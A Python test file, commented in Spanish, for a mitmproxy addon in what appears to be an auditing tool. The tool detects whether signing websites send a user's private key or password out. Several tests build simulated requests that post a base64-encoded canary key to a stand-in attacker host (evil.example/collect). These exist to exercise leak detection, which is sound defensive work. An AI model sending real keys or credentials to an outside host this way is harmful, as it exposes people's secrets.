"""Pruebas del addon de mitmproxy (nivel 4).

Se separan en dos grupos, como el propio addon:

* el lado mitmproxy (los hooks) se ejercita con los flujos sinteticos de
  ``mitmproxy.test.tflow``, sin red;
* el ciclo de vida se prueba con un proxy real delante del servidor de
  laboratorio, incluida la promesa de que la CA efimera desaparece.
"""

from __future__ import annotations

import base64
import os
import urllib.request

import pytest

pytest.importorskip("mitmproxy")

from mitmproxy.test import tflow  # noqa: E402

from firmascope.audit_core.events import EventType, Tag  # noqa: E402
from firmascope.audit_core.secrets import SecretVault  # noqa: E402
from firmascope.evidence_store.store import EvidenceStore  # noqa: E402
from firmascope.labs.server import LabServer  # noqa: E402
from firmascope.proxy_addon import FirmaScopeAddon, ProxyServer, available  # noqa: E402

from conftest import make_config  # noqa: E402

KEY = bytes(range(256)) * 6


@pytest.fixture
def vault():
    with SecretVault() as v:
        v.register(Tag.KEY_FILE, KEY)
        v.register(Tag.KEY_PASSWORD, "contrasena-de-laboratorio")
        yield v


@pytest.fixture
def store(tmp_path):
    s = EvidenceStore(tmp_path, "sesion-proxy")
    s.open_session("https://sitio.example/firmar", {"level": 4}, {})
    yield s
    s.close()


def flow_with(url: str, body: bytes, method: str = "POST", **headers: str):
    flow = tflow.tflow()
    flow.request.method = method
    flow.request.url = url
    flow.request.content = body
    for name, value in headers.items():
        flow.request.headers[name.replace("_", "-")] = value
    return flow


def drained(addon: FirmaScopeAddon, store: EvidenceStore):
    events = []
    addon.drain(store, lambda e: events.append(store.add_event(e)))
    return events


# ----------------------------------------------------------------------
# Lado mitmproxy
# ----------------------------------------------------------------------

def test_el_canario_se_encuentra_en_el_cuerpo_que_viaja(vault, store):
    """El proxy ve el cuerpo tal cual sale: aqui, el .key en base64."""
    addon = FirmaScopeAddon("s", make_config(), vault=vault)
    addon.request(flow_with("https://evil.example/collect",
                            b'{"k":"' + base64.b64encode(KEY) + b'"}'))

    [event] = drained(addon, store)
    assert event.type is EventType.PROXY_REQUEST
    assert event.sensor == "proxy"
    assert Tag.KEY_FILE.value in event.tags
    assert any(m["encoding"] == "base64" for m in event.data["canary_matches"])


def test_el_canario_se_encuentra_dentro_de_un_multipart(vault, store):
    """El caso que solo el proxy ve entero: el fichero dentro del multipart."""
    boundary = "----fs"
    body = (f"--{boundary}\r\nContent-Disposition: form-data; name=\"key\"; "
            f"filename=\"lab.key\"\r\n\r\n").encode() + KEY + f"\r\n--{boundary}--\r\n".encode()
    addon = FirmaScopeAddon("s", make_config(), vault=vault)
    addon.request(flow_with("https://sitio.example/api/server-sign", body,
                            content_type=f"multipart/form-data; boundary={boundary}"))

    [event] = drained(addon, store)
    assert Tag.KEY_FILE.value in event.tags
    assert event.data["content_type"].startswith("multipart/form-data")


def test_la_contrasena_en_un_formulario_urlencoded(vault, store):
    addon = FirmaScopeAddon("s", make_config(), vault=vault)
    addon.request(flow_with("https://sitio.example/login",
                            b"user=x&pwd=contrasena-de-laboratorio",
                            content_type="application/x-www-form-urlencoded"))
    [event] = drained(addon, store)
    assert Tag.KEY_PASSWORD.value in event.tags


def test_cuerpo_sin_canario_queda_sin_clasificar(vault, store):
    addon = FirmaScopeAddon("s", make_config(), vault=vault)
    addon.request(flow_with("https://sitio.example/api", b'{"status":"ok"}'))
    [event] = drained(addon, store)
    assert event.tags == [Tag.UNCLASSIFIED.value]


def test_una_peticion_sin_cuerpo_no_se_etiqueta(vault, store):
    addon = FirmaScopeAddon("s", make_config(), vault=vault)
    addon.request(flow_with("https://sitio.example/app.js", b"", method="GET"))
    [event] = drained(addon, store)
    assert event.tags == []


def test_la_peticion_queda_en_el_registro_de_red(vault, store):
    addon = FirmaScopeAddon("s", make_config(target="https://sitio.example/"), vault=vault)
    addon.request(flow_with("https://evil.example/c", b"x" * 100))
    drained(addon, store)

    [record] = store.requests()
    assert record["sensor"] == "proxy"
    assert record["body_size"] == 100
    assert record["third_party"] is True


def test_el_cuerpo_no_se_conserva_por_defecto(vault, store):
    """Se encolan tamanos, digests y coincidencias; nunca el contenido."""
    addon = FirmaScopeAddon("s", make_config(), vault=vault)
    addon.request(flow_with("https://evil.example/c", base64.b64encode(KEY)))
    record = addon._queue.queue[0]
    assert record.body is None
    assert record.body_digest


def test_con_captura_activa_el_cuerpo_va_a_evidencias(vault, store):
    addon = FirmaScopeAddon("s", make_config(), vault=vault, capture_bodies=True)
    addon.request(flow_with("https://sitio.example/api", b'{"status":"ok"}'))
    drained(addon, store)
    assert store.requests()[0]["body_ref"]


def test_las_credenciales_del_operador_se_omiten(vault, store):
    addon = FirmaScopeAddon("s", make_config(), vault=vault)
    addon.request(flow_with("https://sitio.example/api", b"x",
                            authorization="Bearer secreto", cookie="sid=abc"))
    drained(addon, store)
    headers = {k.lower(): v for k, v in store.requests()[0]["headers"].items()}
    assert headers["authorization"] == "<omitida>"
    assert headers["cookie"] == "<omitida>"


def test_un_fallo_del_sensor_no_corta_el_trafico(vault):
    """El hook no puede lanzar: mitmproxy abortaria la peticion del sitio."""
    addon = FirmaScopeAddon("s", make_config(), vault=vault)

    class Roto:
        @property
        def request(self):
            raise RuntimeError("boom")

    addon.request(Roto())
    assert addon.errors == 1


def test_solo_los_frames_salientes_de_websocket(vault, store):
    addon = FirmaScopeAddon("s", make_config(), vault=vault)
    flow = tflow.twebsocketflow()
    flow.websocket.messages.clear()

    from wsproto.frame_protocol import Opcode
    from mitmproxy.websocket import WebSocketMessage

    flow.websocket.messages.append(WebSocketMessage(Opcode.BINARY, False, b"del servidor"))
    addon.websocket_message(flow)
    flow.websocket.messages.append(WebSocketMessage(Opcode.BINARY, True, KEY))
    addon.websocket_message(flow)

    [event] = drained(addon, store)
    assert event.type is EventType.PROXY_WEBSOCKET
    assert Tag.KEY_FILE.value in event.tags


def test_los_frames_de_websocket_cuentan_como_salida():
    from firmascope.audit_core.events import EGRESS_EVENTS
    assert EventType.PROXY_WEBSOCKET in EGRESS_EVENTS
    assert EventType.PROXY_REQUEST in EGRESS_EVENTS


# ----------------------------------------------------------------------
# Ciclo de vida, con un proxy real
# ----------------------------------------------------------------------

def test_proxy_real_delante_del_laboratorio(vault, store, monkeypatch):
    # urllib respeta NO_PROXY incluso con un ProxyHandler explicito, y los
    # entornos suelen excluir loopback: sin esto la peticion rodearia el proxy.
    for name in ("no_proxy", "NO_PROXY"):
        monkeypatch.delenv(name, raising=False)
    assert available()
    addon = FirmaScopeAddon("s", make_config(), vault=vault)
    with LabServer(port=0) as lab, ProxyServer(addon) as proxy:
        confdir = proxy.confdir
        assert confdir and os.path.isdir(confdir)

        opener = urllib.request.build_opener(
            urllib.request.ProxyHandler({"http": proxy.url}))
        request = urllib.request.Request(
            f"{lab.base_url}/collect/key", data=base64.b64encode(KEY), method="POST",
            headers={"Content-Type": "application/octet-stream"})
        with opener.open(request, timeout=10) as response:
            assert response.status == 200

    [event] = drained(addon, store)
    assert event.data["url"].endswith("/collect/key")
    assert Tag.KEY_FILE.value in event.tags
    # El laboratorio recibio la peticion: el proxy la reenvio, no la trago.
    assert lab.received.collected[0]["path"] == "/collect/key"


def test_la_ca_efimera_desaparece_al_detener(vault):
    """La clave privada de la CA no sobrevive a la sesion."""
    proxy = ProxyServer(FirmaScopeAddon("s", make_config(), vault=vault)).start()
    confdir = proxy.confdir
    ca_files = os.listdir(confdir)
    assert any("mitmproxy-ca" in name for name in ca_files), ca_files

    proxy.stop()
    assert not os.path.exists(confdir)
    assert proxy.confdir is None


def test_detener_dos_veces_no_falla(vault):
    proxy = ProxyServer(FirmaScopeAddon("s", make_config(), vault=vault)).start()
    proxy.stop()
    proxy.stop()


# ----------------------------------------------------------------------
# Seleccion desde la CLI
# ----------------------------------------------------------------------

@pytest.mark.parametrize("flag,level,esperado", [
    (None, 4, True),      # nivel 4: activo si esta instalado
    (None, 3, False),     # por debajo de 4 nunca
    (False, 4, False),    # --no-proxy
    (True, 4, True),      # --proxy
    (True, 2, False),     # --proxy en nivel 2 se ignora
])
def test_seleccion_del_proxy(flag, level, esperado):
    from firmascope.audit_core.config import AuditLevel
    from firmascope.cli.main import _proxy_wanted
    assert _proxy_wanted(flag, AuditLevel(level)) is esperado
